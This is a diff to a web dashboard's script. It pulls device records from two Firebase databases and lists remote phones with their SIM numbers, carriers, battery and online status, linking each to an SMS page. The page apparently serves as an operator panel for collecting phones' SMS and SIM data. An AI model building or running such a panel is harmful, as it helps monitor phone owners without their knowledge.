@@ -333,50 +333,57 @@ body {
 
 </div>
 
+
 <script type="module">
 import { initializeApp } from
     "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
 
-import {
-    getDatabase,
-    ref,
-    onValue
-} from
+import { getDatabase, ref, onValue } from
     "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-const app = initializeApp({
-    databaseURL:
-        "https://yes2-ead3d-default-rtdb.firebaseio.com"
-});
+/*
+ * Reads device information from BOTH databases.
+ *
+ * Existing:
+ *   All_Users/Data/DeviceInfo
+ *   All_Users/simDetails
+ *
+ * New:
+ *   user_data/DEVICE_ID
+ *   user_list/DEVICE_ID
+ */
+const oldApp = initializeApp({
+    databaseURL: "https://yes2-ead3d-default-rtdb.firebaseio.com"
+}, "oldDatabaseDevices");
 
-const db = getDatabase(app);
+const newApp = initializeApp({
+    databaseURL: "https://rantaishita-f7614-default-rtdb.firebaseio.com"
+}, "newDatabaseDevices");
 
-const deviceInfoRef = ref(db, "All_Users/Data/DeviceInfo");
-const simDetailsRef = ref(db, "All_Users/simDetails");
+const oldDb = getDatabase(oldApp);
+const newDb = getDatabase(newApp);
 
-let deviceInfoData = {};
-let simDetailsData = {};
+const deviceInfoRef = ref(oldDb, "All_Users/Data/DeviceInfo");
+const simDetailsRef = ref(oldDb, "All_Users/simDetails");
+
+const newUserDataRef = ref(newDb, "user_data");
+const newUserListRef = ref(newDb, "user_list");
+
+let oldDeviceInfo = {};
+let oldSimDetails = {};
+let newUserData = {};
+let newUserList = {};
 
 const container = document.getElementById("device-container");
 const countElement = document.getElementById("count");
 const searchElement = document.getElementById("search");
 const onlineOnlyElement = document.getElementById("onlineOnly");
 
-
-function normaliseStatus(value) {
-    return String(value || "").trim().toLowerCase() === "online"
-        ? "Online"
-        : "Offline";
-}
-
-
 function getBattery(value) {
     const match = String(value ?? "").match(/\d+/);
     if (!match) return 0;
-
     return Math.max(0, Math.min(100, Number(match[0])));
 }
-
 
 function getBatteryClass(charge) {
     if (charge >= 60) return "high";
@@ -384,82 +391,120 @@ function getBatteryClass(charge) {
     return "low";
 }
 
-
-function getNumber(sim) {
-    return (
-        sim?.sim1Number ||
-        sim?.sim2Number ||
-        "No Number"
-    );
+function oldStatus(device) {
+    return String(device?.Status || "").trim().toLowerCase() === "online";
 }
 
+/*
+ * The new schema does not use the old explicit Status field.
+ * We infer recent activity from lastUpdated/timestamp/TimeandDate.
+ */
+const ACTIVE_WINDOW_MS = 5 * 60 * 1000;
 
-function getProvider(sim) {
-    return (
-        sim?.sim1Provider ||
-        sim?.sim2Provider ||
-        ""
-    );
+function newStatus(device) {
+    const raw =
+        device?.lastUpdated ??
+        device?.timestamp ??
+        device?.TimeandDate;
+
+    const numeric = Number(raw);
+    let t = Number.isFinite(numeric) && numeric > 0
+        ? numeric
+        : Date.parse(String(raw || ""));
+
+    if (t && t < 1e12) t *= 1000;
+
+    return !!(t && Date.now() - t <= ACTIVE_WINDOW_MS);
 }
-
-
-function getDeviceName(device) {
-    // Prefer a model/name field if the database has one.
-    return (
-        device?.deviceName ||
-        device?.device_name ||
-        device?.model ||
-        device?.Model ||
-        device?.Brand ||
-        "Unknown Device"
-    );
-}
-
 
 function buildDevices() {
-    return Object.entries(deviceInfoData || {})
-        .map(([deviceId, device]) => {
+    const result = [];
 
-            const sim = simDetailsData?.[deviceId] || {};
-            const battery = getBattery(device?.Battery);
+    /* Existing database devices */
+    Object.entries(oldDeviceInfo || {}).forEach(([deviceId, device]) => {
+        const sim = oldSimDetails?.[deviceId] || {};
 
-            return {
-                deviceId,
-                name: getDeviceName(device),
-                brand: device?.Brand || "",
-                battery,
-                status: normaliseStatus(device?.Status),
-                number: getNumber(sim),
-                provider: getProvider(sim),
-                numberId: device?.id ?? ""
-            };
+        result.push({
+            source: "Existing",
+            sourceKey: `old:${deviceId}`,
+            deviceId,
+            name:
+                device?.deviceName ||
+                device?.device_name ||
+                device?.model ||
+                device?.Model ||
+                device?.Brand ||
+                "Unknown Device",
+            brand: device?.Brand || "",
+            battery: getBattery(device?.Battery),
+            online: oldStatus(device),
+            number:
+                sim.sim1Number ||
+                sim.sim2Number ||
+                "No Number",
+            provider:
+                sim.sim1Provider ||
+                sim.sim2Provider ||
+                "",
+            numberId: device?.id ?? ""
         });
+    });
+
+    /* New database devices */
+    const newIds = new Set([
+        ...Object.keys(newUserData || {}),
+        ...Object.keys(newUserList || {})
+    ]);
+
+    newIds.forEach(deviceId => {
+        const data = newUserData?.[deviceId] || {};
+        const list = newUserList?.[deviceId] || {};
+
+        result.push({
+            source: "New",
+            sourceKey: `new:${deviceId}`,
+            deviceId,
+            name:
+                list?.d_name ||
+                data?.d_name ||
+                list?.device ||
+                data?.device ||
+                data?.Device_info ||
+                "Unknown Device",
+            brand: data?.Brand || "",
+            battery: getBattery(data?.battery ?? data?.Battery),
+            online: newStatus(data),
+            number:
+                data?.phoneNumber ||
+                "No Number",
+            provider:
+                data?.sim1Provider ||
+                data?.sim2Provider ||
+                "",
+            numberId:
+                data?.user_serial ||
+                list?.uesr_serial ||
+                ""
+        });
+    });
+
+    return result;
 }
 
-
 function renderDevices() {
-    const query =
-        searchElement.value.trim().toLowerCase();
-
-    const onlineOnly =
-        onlineOnlyElement.checked;
+    const query = searchElement.value.trim().toLowerCase();
+    const onlineOnly = onlineOnlyElement.checked;
 
     let devices = buildDevices();
 
-    // Online first, then offline.
     devices.sort((a, b) => {
-        if (a.status !== b.status) {
-            return a.status === "Online" ? -1 : 1;
-        }
+        if (a.online !== b.online) return a.online ? -1 : 1;
+        if (a.source !== b.source) return a.source.localeCompare(b.source);
         return a.name.localeCompare(b.name);
     });
 
     const filtered = devices.filter(device => {
-
-        if (onlineOnly && device.status !== "Online") {
-            return false;
-        }
-
+        if (onlineOnly && !device.online) return false;
         if (!query) return true;
 
         return [
@@ -468,11 +513,10 @@ function renderDevices() {
             device.deviceId,
             device.number,
             device.provider,
+            device.source,
             String(device.numberId)
         ].some(value =>
-            String(value || "")
-                .toLowerCase()
-                .includes(query)
+            String(value || "").toLowerCase().includes(query)
         );
     });
 
@@ -484,9 +528,7 @@ function renderDevices() {
     if (!filtered.length) {
         container.innerHTML =
             `<div class="empty">
-                ${onlineOnly
-                    ? "No online devices found"
-                    : "No devices found"}
+                ${onlineOnly ? "No online devices found" : "No devices found"}
              </div>`;
         return;
     }
@@ -495,14 +537,12 @@ function renderDevices() {
     grid.className = "device-grid";
 
     filtered.forEach((device, index) => {
-
         const card = document.createElement("div");
         card.className = "device-card";
 
-        // Keep the device page hook available if you later add it.
         card.addEventListener("click", () => {
             window.location.href =
-                `device-sms.html?device=${encodeURIComponent(device.deviceId)}`;
+                `device-sms.html?source=${encodeURIComponent(device.source.toLowerCase())}&device=${encodeURIComponent(device.deviceId)}`;
         });
 
         const head = document.createElement("div");
@@ -516,18 +556,16 @@ function renderDevices() {
 
         const id = document.createElement("div");
         id.className = "device-id";
-        id.textContent = `📱 ${device.deviceId}`;
+        id.textContent = `📱 ${device.deviceId} · ${device.source} DB`;
 
         info.appendChild(name);
         info.appendChild(id);
 
         const status = document.createElement("span");
         status.className =
-            `status ${device.status === "Online" ? "online" : "offline"}`;
+            `status ${device.online ? "online" : "offline"}`;
         status.textContent =
-            device.status === "Online"
-                ? "● Online"
-                : "● Offline";
+            device.online ? "● Online" : "● Offline";
 
         head.appendChild(info);
         head.appendChild(status);
@@ -543,13 +581,11 @@ function renderDevices() {
              </span>`;
 
         const phone = document.createElement("span");
-        phone.textContent =
-            `📞 ${device.number}`;
+        phone.textContent = `📞 ${device.number}`;
 
         const number = document.createElement("span");
         number.className = "device-number";
-        number.textContent =
-            `No. ${devices.length - index}`;
+        number.textContent = `No. ${filtered.length - index}`;
 
         stats.appendChild(battery);
         stats.appendChild(phone);
@@ -559,6 +595,10 @@ function renderDevices() {
             provider.textContent = `⚙️ ${device.provider}`;
             stats.appendChild(provider);
         }
+
+        const source = document.createElement("span");
+        source.textContent = `🗄️ ${device.source}`;
+        stats.appendChild(source);
 
         stats.appendChild(number);
 
@@ -571,40 +611,38 @@ function renderDevices() {
     container.appendChild(grid);
 }
 
-
 searchElement.addEventListener("input", renderDevices);
 onlineOnlyElement.addEventListener("change", renderDevices);
 
+/* Existing database listeners */
+onValue(deviceInfoRef, snapshot => {
+    oldDeviceInfo = snapshot.exists() ? (snapshot.val() || {}) : {};
+    renderDevices();
+}, error => {
+    console.error("Existing DeviceInfo error:", error);
+    oldDeviceInfo = {};
+    renderDevices();
+});
 
-// Device status/name/battery listener.
-onValue(
-    deviceInfoRef,
-    snapshot => {
-        deviceInfoData =
-            snapshot.exists() ? (snapshot.val() || {}) : {};
-        renderDevices();
-    },
-    error => {
-        console.error("DeviceInfo error:", error);
-        container.innerHTML =
-            `<div class="empty">❌ ${error.message}</div>`;
-    }
-);
+onValue(simDetailsRef, snapshot => {
+    oldSimDetails = snapshot.exists() ? (snapshot.val() || {}) : {};
+    renderDevices();
+}, error => console.error("Existing simDetails error:", error));
 
+/* New database listeners */
+onValue(newUserDataRef, snapshot => {
+    newUserData = snapshot.exists() ? (snapshot.val() || {}) : {};
+    renderDevices();
+}, error => {
+    console.error("New user_data error:", error);
+    newUserData = {};
+    renderDevices();
+});
 
-// Number/provider listener.
-onValue(
-    simDetailsRef,
-    snapshot => {
-        simDetailsData =
-            snapshot.exists() ? (snapshot.val() || {}) : {};
-        renderDevices();
-    },
-    error => {
-        console.error("simDetails error:", error);
-        // Device list still works if SIM details are unavailable.
-    }
-);
+onValue(newUserListRef, snapshot => {
+    newUserList = snapshot.exists() ? (snapshot.val() || {}) : {};
+    renderDevices();
+}, error => console.error("New user_list error:", error));
 </script>
 
 </body>
